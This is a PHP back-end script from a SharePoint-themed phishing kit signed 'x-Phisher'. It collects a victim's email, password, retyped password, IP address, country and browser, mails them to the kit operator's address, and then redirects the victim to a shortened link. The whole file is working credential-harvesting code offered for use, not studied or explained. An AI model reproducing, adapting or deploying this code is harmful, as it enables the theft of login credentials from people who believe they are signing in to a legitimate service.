<?php
/*
======================= Coded By x-Phisher ======================
____  ___        __________.__    .__       .__                  
\   \/  /        \______   \  |__ |__| _____|  |__   ___________ 
 \     /   ______ |     ___/  |  \|  |/  ___/  |  \_/ __ \_  __ \
 /     \  /_____/ |    |   |   Y  \  |\___ \|   Y  \  ___/|  | \/
/___/\  \         |____|   |___|  /__/____  >___|  /\___  >__|   
      \_/                       \/        \/     \/     \/       
========================= xphisher.com ===========================
*/
if (strlen($_POST['p_e'])<6) {
	HEADER("Location: ../login_error/".$auth, true, 303);
}
$Email    = $_SESSION['e'] = $_SESSION['e'];
$Password = $_SESSION['p'] = $_SESSION['p'];
$Password_error = $_SESSION['p_e'] = $_POST['p_e'];
$auth = $_SESSION ['authenticator'] = $_SESSION['authenticator'];
$TIME_DATE = date('H:i:s d/m/Y');
include('../Your_email.php');
include('../BOTS/get_browser.php');
include('../BOTS/get_ip.php');
$X_MESSAGE = '

[ Email ] = '.$Email.'<br/>
[ Password ] = '.$Password.'<br/>
[ Password Error ] = '.$Password_error.'<br/>
[ Ip Address ] = '.$_COOKIE['ip11'].'<br/>
[ Country ] = '.$LOOKUP_COUNTRY.'<br/>
[ Browser ] = '.X_Browser($_SERVER['HTTP_USER_AGENT'])." On ".X_OS($_SERVER['HTTP_USER_AGENT']).'<br/>
[ Time/Date ] = '.$TIME_DATE.'<br/>

© 2019 xphisher.com';

$X_SUBJECT = "Sharepoint v5 | ".$Email."  | ".$LOOKUP_COUNTRY;
$X_HEADERS = "From:X-Sharepoint<Xphisher>\n";
$X_HEADERS .= "MIME-Version: 1.0\n";
$X_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
mail($Your_Email, $X_SUBJECT, $X_MESSAGE, $X_HEADERS);
HEADER("Location: https://bit.ly/1cujSVq", true, 303);
?>
